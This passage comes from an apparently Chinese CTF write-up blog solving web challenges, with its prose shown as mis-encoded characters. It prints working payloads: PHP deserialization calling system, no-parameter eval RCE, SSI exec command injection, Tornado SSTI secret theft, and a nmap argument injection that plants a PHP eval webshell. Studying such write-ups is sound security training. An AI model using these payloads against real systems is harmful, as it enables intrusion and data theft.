class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—ï¼Œå°è¯•ååºåˆ—åŒ–ã€‚expï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;cd /../../tmp;cat flagoefiu4r93&quot;</span>;<span class="comment">//æ›´æ”¹$pçš„å€¼ï¼ŒæŸ¥æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆpayloadï¼š</p>
<p><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:31:&quot;cd /../../tmp;cat flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></p>
<hr>
<h4 id="å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢"><a href="#å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="*[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢"></a>*[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</h4><p>ä¸‹è½½æ–‡ä»¶åå‘ç°æœ‰å¾ˆå¤šphpæ–‡ä»¶ï¼Œæœ¬é¢˜ç›®è€ƒæŸ¥çš„æ˜¯ç¼–å†™<code>è„šæœ¬</code>çš„èƒ½åŠ›ï¼Œæ‰¾å‡ºå­˜åœ¨å¯ç”¨shellçš„phpæ–‡ä»¶ã€‚</p>
<p>å‚è€ƒé“¾æ¥ï¼š[(40æ¡æ¶ˆæ¯) <a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/115256974">å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢_Sk1yçš„åšå®¢-CSDNåšå®¢</a></p>
<hr>
<h4 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="*[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>*[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h4><p>gitæ³„éœ²ï¼Œgithackæ‰«åˆ°index.phpæ–‡ä»¶</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒä¸ªifè¯­å¥è¡¨ç¤ºæˆ‘ä»¬ä¸èƒ½ä¼ å‚ä¼ªåè®®ï¼Œç¬¬ä¸‰ä¸ªifè¯­å¥çš„æ­£åˆ™åŒ¹é…æ¶‰åŠ<code>é€’å½’æ¨¡å¼</code>å’Œ<code>æ— å‚æ•°å‡½æ•°çš„æ ¡éªŒ</code>ï¼Œå‚è€ƒé“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">PHP Parametric Function RCE Â· skyâ€™s blog (skysec.top)</a></p>
<p>ç®€å•ç‚¹æ¥è¯´ï¼Œå°±å¯ä»¥è¿™æ ·ç†è§£ï¼š</p>
<p><code>&#39;/[a-z,_]+\(\)/&#39;</code><br>æŠŠ<code>(?R)</code>æŒ–æ‰å¾—åˆ°è¿™ä¸ªæ­£åˆ™ï¼Œè¿™ä¸ªæ­£åˆ™å¯ä»¥åŒ¹é…ç±»ä¼¼è¿™æ ·çš„å­—ç¬¦ä¸²ï¼š<code>phpinfo()</code><br>ä½†æ˜¯æ‹¬å·é‡Œé¢æœ‰ä¸€ä¸ªé€’å½’æ¨¡å¼ï¼Œå¯ä»¥ç†è§£æˆå¯ä»¥é€’å½’ï¼š</p>
<p><code>phpinfo(phpinfo(phpinfo()))</code><br>æ— ç©·çš„é€’å½’ä¸‹å»ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¦ä¼ çš„æ˜¯å‡½æ•°åï¼Œä½†æ˜¯é‡Œé¢ä¸èƒ½æœ‰å‚æ•°ã€‚å› æ­¤è¿™é¢˜çš„è€ƒç‚¹ä¹Ÿå°±æ˜¯<code>æ— å‚æ•°RCE</code></p>
<p>æ–¹æ³•ä¸€ï¼š</p>
<p>?exp&#x3D;readfile(session_id(session_start()));</p>
<p>PHPSESSID&#x3D;flag.php</p>
<p>æ–¹æ³•äºŒï¼š</p>
<p>?exp&#x3D;highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</p>
<p>ç„¶åä¸æ–­å‘é€</p>
<hr>
<h4 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h4><p>Nginxé‡è¦é…ç½®æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š/etc/nginx</span><br><span class="line">ä¸»é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf/nginx.conf</span><br><span class="line">ç®¡ç†è„šæœ¬ï¼š/usr/lib64/systemd/system/nginx.service</span><br><span class="line">æ¨¡å—ï¼š/usr/lisb64/nginx/modules</span><br><span class="line">åº”ç”¨ç¨‹åºï¼š/usr/sbin/nginx</span><br><span class="line">ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š/usr/share/nginx/html</span><br><span class="line">æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/nginx</span><br><span class="line">é…ç½®æ–‡ä»¶ç›®å½•ä¸ºï¼š/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure>

<p><code>â„†</code>è¿™ä¸ªå­—ç¬¦,å¦‚æœä½¿ç”¨python3è¿›è¡Œidnaç¼–ç çš„è¯<br>print(â€˜â„†â€™.encode(â€˜idnaâ€™))<br>ç»“æœ<br>bâ€™c&#x2F;uâ€™<br>å¦‚æœå†ä½¿ç”¨utf-8è¿›è¡Œè§£ç çš„è¯<br>print(bâ€™c&#x2F;uâ€™.decode(â€˜utf-8â€™))<br>ç»“æœ<br>c&#x2F;u<br>é€šè¿‡è¿™ç§æ–¹æ³•å¯ä»¥ç»•è¿‡æœ¬é¢˜ï¼Œè¿˜å¯ä»¥ä½¿ç”¨<code>â„‚</code>å­—ç¬¦ç»•è¿‡c</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://suctf.câ„†sr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://suctf.câ„†sr/fffffflag</span><br></pre></td></tr></table></figure>

<p><strong>åˆ©ç”¨urlunsplitè§£é¢˜</strong></p>
<p>â€ƒå‡å¦‚æˆ‘ä»¬ä¼ å…¥ï¼š<code>file:////www.example.com</code>,è¿›è¡Œäº† <code>list(urlsplit(url))</code> å‡½æ•°ä»¥åå°±å˜æˆäº†<code>[&#39;file&#39;, &#39;&#39;, &#39;//www.example.com&#39;, &#39;&#39;, &#39;&#39;]</code>ã€‚ä¹Ÿå°±æ˜¯å®ƒè§£æåŸŸåå—ä¸ºç©ºäº†ã€‚<br>ä½†å½“å†æ‰§è¡Œ urlunsplit æ—¶ å°±ä¼šåˆæˆä¸º <code>file://www.example.com</code> è¿™æ ·å°±è¾¾åˆ°äº†ç»•è¿‡çš„æ•ˆæœäº†ï¼Œè¿˜æ˜¯éå¸¸å¥ˆæ–¯çš„ï¼ï¼</p>
<hr>
<h4 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h4><p>&#x3D;&#x3D;Apache SSIè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´&#x3D;&#x3D;	å‚è€ƒé“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1540513">Apache SSI è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç° - äº‘+ç¤¾åŒº - è…¾è®¯äº‘ (tencent.com)</a></p>
<p>é¦–å…ˆæ˜¯æºç æ³„éœ²ï¼Œè®¿é—®index.php.swpï¼Œæ˜¾ç¤ºæºç ï¼Œå­˜åœ¨md5éªŒè¯ï¼Œæ‹¿è„šæœ¬è·‘å°±ok</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">999999999</span>):</span><br><span class="line">  h = hashlib.md5(<span class="built_in">str</span>(i).encode()).hexdigest()[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">  <span class="keyword">if</span> h == <span class="string">&#x27;6d0bc1&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°password&#x3D;2020666</p>
<p>åœ¨æŠ“çš„åŒ…ä¸­æœ‰ä¸€ä¸ªurlï¼Œä»¥shtmlç»“å°¾ï¼Œæƒ³åˆ°ssiè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œå¯ä»¥ä¸Šä¼ ä¸€ä¸ªshtmlæ–‡ä»¶ï¼Œä½†è¿™é‡Œæ²¡æœ‰æ–‡ä»¶ä¸Šä¼ çš„å…¥å£ï¼Œæƒ³åˆ°å¯ä»¥åˆ©ç”¨usernameä¼ å‚ï¼Œ</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;cd ../;cat flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;&amp;password=2020666</span><br></pre></td></tr></table></figure>

<p>ç„¶åè®¿é—®å“åº”æŠ¥æ–‡ç»™çš„urlï¼Œæ‹¿åˆ°flag</p>
<hr>
<h4 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h4><p>æ¶‰åŠrenderå‡½æ•°ã€sstiæ³¨å…¥ã€Tornado(pythonçš„webæ¡†æ¶)</p>
<p>ä¸‰ä¸ªtxtæ–‡ä»¶ï¼ŒçŸ¥é“äº†flagæ–‡ä»¶æ˜¯<code>/fllllllllllllag</code></p>
<p>åœ¨hint.txtæ–‡ä»¶ä¸­ä¹ŸçŸ¥é“äº†åŠ å¯†æ ¼å¼<code>md5(cookie_secret+md5(filename))</code></p>
<p>é‡è¦çš„æ˜¯æ‰¾åˆ°<code>cookie_secret</code>ï¼Œ</p>
<p>é‚£ä¹ˆ cookie_secret åˆæ˜¯ä»€ä¹ˆä¸œè¥¿å‘¢ï¼Œåœ¨ Tornado ä¸­ï¼Œé€šè¿‡åœ¨ tornado.web.Application ä¸­æ·»åŠ  cookie_secret å‚æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ set_secure_cookie() å’Œ get_secure_cookie() å‡½æ•°æ¥å‘é€å’Œå–å¾—æµè§ˆå™¨çš„ cookies ï¼Œå€ŸåŠ©è¯¥å‚æ•°å¯ä»¥å¯¹ cookie è¿›è¡Œç®€æ˜“åŠ å¯†ä»¥é˜²æ­¢ Cookie è¢«æ¶æ„ç¯¡æ”¹ã€‚å…³äº Tornado çš„ cookie_secret å€¼ å¯ä»¥å‚è€ƒåšå®¢<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhanghongfeng/p/8182909.html">tornadoå®‰å…¨åº”ç”¨ä¹‹cookie - ä¸€å¼ çº¢æ«å¶ - åšå®¢å›­ (cnblogs.com)</a>æˆ–è€…<a target="_blank" rel="noopener" href="https://www.cnblogs.com/liyqiang/p/7140530.html">tornadoä¸­çš„cookie - TianTianLi - åšå®¢å›­ (cnblogs.com)</a></p>
<p>ç®€å•æ€»ç»“ä¸€ä¸‹å°±æ˜¯ï¼Œcookie_secret æ˜¯å­˜åœ¨äº settings ä¸­çš„ï¼Œsettings åˆä½œä¸ºå‚æ•°ä¼ å…¥äº† Application æ„é€ å‡½æ•°ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ self.application.settings æ¥è·å–åˆ° cookie_secretã€‚åˆå› ä¸ºæ ¹æ®å®˜æ–¹æ–‡æ¡£ï¼Œ RequestHandler.settings çš„åˆ«åæ˜¯ self.application.settingsï¼Œä¸” handler æŒ‡å‘å¤„ç†å½“å‰è¿™ä¸ªé¡µé¢çš„ RequestHandler å¯¹è±¡ï¼Œæ•…æœ€ç»ˆçš„æ•ˆæœå°±æ˜¯å¯ä»¥ç›´æ¥é€šè¿‡ handler.settings æ¥å¾—åˆ° cookie_secret çš„å€¼ã€‚</p>
<p>åœ¨ä¸€ä¸ªerroré¡µé¢å­˜åœ¨sstiæ³¨å…¥ï¼Œä¼ å‚<code>msg=&#123;&#123;handler.settings&#125;&#125;</code></p>
<p>æ‹¿åˆ°<code>cookie_secret</code></p>
<p>è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å¯¼å…¥hashlibæ¨¡å—</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment">#è·å–ä¸€ä¸ªmd5åŠ å¯†ç®—æ³•å¯¹è±¡</span></span><br><span class="line">md = hashlib.md5()</span><br><span class="line"><span class="comment">#ç”¨æä¾›çš„ å­—èŠ‚ä¸² æ›´æ–°æ­¤å“ˆå¸Œå¯¹è±¡(hash object)çš„çŠ¶æ€ã€‚</span></span><br><span class="line">md.update(<span class="string">&#x27;/fllllllllllllag&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment">#NOTICEï¼š</span></span><br><span class="line"><span class="comment">#update()æ–¹æ³•éœ€è¦æ¥æ”¶çš„å‚æ•°æ˜¯ä¸€ä¸ªå­—èŠ‚å¯¹è±¡ã€‚</span></span><br><span class="line"><span class="comment">#å‘å¯¹è±¡ä¸­ä¼ å…¥å­—èŠ‚ä¸²æ—¶ï¼Œå¿…é¡»ä¸ºç¼–ç ç±»å‹ã€‚å¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²å‰b&#x27; &#x27;çš„æ–¹æ³•æˆ–ä½¿ç”¨.encode(&#x27;UTF-8&#x27;)çš„æ–¹æ³•ï¼Œä½¿å­—ç¬¦ä¸²å˜ä¸ºbytesç±»å‹</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ä»¥åå…­è¿›åˆ¶æ•°å­—å­—ç¬¦ä¸²çš„å½¢å¼è¿”å›æ‘˜è¦å€¼ï¼ˆå“ˆå¸Œå‡½æ•°è®¡ç®—åç”Ÿæˆçš„å€¼å°±å«åšæ‘˜è¦æˆ–è€…æ‘˜è¦å€¼ï¼‰</span></span><br><span class="line">fact = md.hexdigest()</span><br><span class="line"></span><br><span class="line">md = hashlib.md5()</span><br><span class="line">md.update((<span class="string">&#x27;8a666cd6-6ece-4793-9236-dd7c75a5ff97&#x27;</span> + fact).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(md.hexdigest())</span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆpayloadï¼š<code>?filename=/fllllllllllllag&amp;filehash=1c96931b251b0ee71fd6751fb4d68db9</code></p>
<h4 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="*[HCTF 2018]admin"></a>*[HCTF 2018]admin</h4><p>æœ‰ä¸‰ç§æ–¹æ³•ï¼š</p>
<ol>
<li><p>flask sessionä¼ªé€ </p>
<p>æ³¨å†Œè´¦å·ï¼Œç„¶ååœ¨æ”¹å¯†ç çš„é¡µé¢æºç å‘ç° <a target="_blank" rel="noopener" href="https://github.com/woadsl1234/hctf_flask/">https://github.com/woadsl1234/hctf_flask/</a> ï¼Œåœ¨githubä¸Šå¯ä»¥æ‰¾åˆ°æºç ã€‚flaskæ˜¯è½»é‡çº§webæ¡†æ¶ï¼Œsessionå­˜åœ¨å®¢æˆ·ç«¯ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ªé€ session(cookie)ã€‚<br>ç¬¬ä¸€æ­¥ï¼Œæƒ³è¦åŠ å¯†ä¼ªé€ ç”Ÿæˆæˆ‘ä»¬è‡ªå·±çš„sessionçš„è¯ï¼Œè¿˜éœ€è¦çŸ¥é“flaskç”¨æ¥ç­¾åçš„<code>SECRET_KEY</code>ï¼Œåœ¨config.pyé‡Œã€‚<br>ç¬¬äºŒæ­¥ï¼Œæ‰¾åˆ°flask sessionåŠ å¯†è„šæœ¬ï¼Œç„¶åéšä¾¿æ‰¾ä¸€ä¸ªè‡ªå·±çš„cookieï¼Œè§£å¯†åå§nameçš„å€¼æ”¹ä¸ºadminå†è¿›è¡ŒåŠ å¯†ã€‚ï¼ˆ&#x3D;&#x3D;è¿™é‡Œè„šæœ¬ä¸ä¼šä½¿ç”¨&#x3D;&#x3D;ï¼‰<br>æœ€åï¼Œå°†sessionè¾“å›å»ï¼Œè¿”å›indexå¾—flagã€‚</p>
</li>
<li><p>unicodeæ¬ºéª—</p>
<p>é¦–å…ˆæ³¨å†Œè´¦å·ï¼šá´¬á´°á´¹á´µá´ºï¼Œå¯†ç ï¼š123<br>ç„¶åæ›´æ”¹å¯†ç <br>æœ€åä»¥adminç™»å½•å¤§è‡´çš„æ€è·¯æ˜¯ï¼š<br>åœ¨æ³¨å†Œçš„æ—¶å€™ â€á´¬á´°á´¹á´µá´ºâ€œ ç»è¿‡strlower()ï¼Œè½¬    æˆâ€ADMINâ€œ ï¼Œ åœ¨ä¿®æ”¹å¯†ç çš„æ—¶å€™ â€ADMINâ€œç»è¿‡strlower()å˜æˆâ€adminâ€œ , å½“æˆ‘ä»¬å†æ¬¡é€€å‡ºç™»å½•çš„æ—¶å€™ â€adminâ€œç»è¿‡strlower()å˜æˆâ€adminâ€œ(æ²¡å•¥åµç”¨ï¼Œä½†æ˜¯ä½ å·²ç»çŸ¥é“äº†ä¸€ä¸ªå¯†ç å·²çŸ¥çš„â€adminâ€œï¼Œè€Œä¸”åœ¨index.htmlä¸­å¯ä»¥çœ‹åˆ°åªè¦session[â€˜nameâ€™]&#x3D;&#x3D;â€™adminâ€™,ä¹Ÿå°±æ˜¯åªè¦ç”¨æˆ·åæ˜¯â€™adminâ€˜å°±å¯æˆåŠŸç™»å½•äº†)</p>
</li>
<li><p>æ¡ä»¶ç«äº‰</p>
<p>ä»”ç»†è§‚å¯Ÿæºç ï¼Œå¯ä»¥å‘ç°loginå‡½æ•°å’Œchangeå‡½æ•°éƒ½åœ¨æ²¡æœ‰å®Œå…¨checkèº«ä»½çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œäº†sessionæœ‰å…³çš„èµ‹å€¼ã€‚<br>æˆ‘ä»¬å¯ä»¥è¿™æ ·è®¾æƒ³ï¼Œä¸€ä¸ªè¿›ç¨‹ä»¥æ­£å¸¸è´¦å·ä¸€ç›´ä¾æ¬¡è¿›è¡Œç™»å½•ã€æ”¹å¯†ç æ“ä½œï¼Œå¦ä¸€ä¸ªè¿›ç¨‹åŒæ—¶ä¸€ç›´ä¾æ¬¡è¿›è¡Œæ³¨é”€ã€ä»¥adminç”¨æˆ·ååŠ è¿›ç¨‹1æ›´æ”¹çš„æ–°å¯†ç è¿›è¡Œç™»å½•ã€‚å°±æœ‰å¯èƒ½å‡ºç°å½“è¿›ç¨‹1è¿›è¡Œåˆ°æ”¹å¯†ç å‡½æ•°æ—¶ï¼Œè¿›ç¨‹2è¿›è¡Œåˆ°ç™»å½•æ“ä½œï¼Œè¿™ä¸ªæ—¶å€™è¿›ç¨‹1éœ€è¦ä»sessionä¸­å–å‡ºnameï¼Œè€Œè¿›ç¨‹2æ­¤æ—¶æŠŠsession[â€˜nameâ€™]æ”¹æˆäº†adminã€‚<br>æ‰€ä»¥å°±å¯ä»¥ç¼–å†™è„šæœ¬è¿›è¡Œæ¡ä»¶ç«äº‰ï¼Œæ¡ä»¶ç«äº‰ç»“æŸçš„æ ‡å¿—ä¸ºè¿›ç¨‹2ç™»å½•æ“ä½œæˆåŠŸï¼Œå³é‡å®šå‘åˆ°&#x2F;indexï¼ˆ&#x3D;&#x3D;è¿™é‡Œè„šæœ¬ä¸ä¼šå†™&#x3D;&#x3D;ï¼‰</p>
</li>
</ol>
<hr>
<h4 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="*[BUUCTF 2018]Online Tool"></a>*[BUUCTF 2018]Online Tool</h4><p><a target="_blank" rel="noopener" href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/#2-CVE-2016-10045">è°ˆè°ˆescapeshellargå‚æ•°ç»•è¿‡å’Œæ³¨å…¥çš„é—®é¢˜ (lmxspace.com)</a></p>
<p>remote_addrå’Œx_forwarded_forè¿™ä¸¤ä¸ªæ˜¯è§çš„æ¯”è¾ƒå¤šçš„ï¼ŒæœåŠ¡å™¨è·å–ipç”¨çš„ï¼Œè¿™é‡Œæ²¡ä»€ä¹ˆç”¨</p>
<p>å‘ç°åœ¨nmapå‘½ä»¤ä¸­ æœ‰ä¸€ä¸ªå‚æ•°-oGå¯ä»¥å®ç°å°†å‘½ä»¤å’Œç»“æœå†™åˆ°æ–‡ä»¶</p>
<p>è¿™ä¸ªå‘½ä»¤å°±æ˜¯æˆ‘ä»¬çš„è¾“å…¥å¯æ§ï¼ç„¶åå†™å…¥åˆ°æ–‡ä»¶ï¼OKå¾ˆè‡ªç„¶çš„æƒ³åˆ°äº†ä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬äº†â€¦</p>
<p>æˆ‘ä»¬æ¥æ„é€ payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=<span class="string">&#x27; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#x27;</span></span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œåä¼šè¿”å›æ–‡ä»¶å¤¹åï¼Œç„¶åç”¨èšå‰‘è¿æ¥ï¼Œæ‹¿åˆ°flag</p>
<hr>
<h4 id="CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb"><a href="#CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb"></a>[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb</h4><p>å‘ç°robots.txtæ–‡ä»¶æœ‰æç¤ºï¼Œ<code>*.php.bak</code>ï¼Œè¯´æ˜æœ‰å¤‡ä»½æ–‡ä»¶æ³„éœ²ï¼Œåœ¨f12çš„ç½‘ç»œé‡Œå‘ç°äº†image.phpï¼Œå°è¯•ä¸‹è½½image.php.bakï¼ŒæˆåŠŸäº†ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$path</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$path</span>);</span><br><span class="line"><span 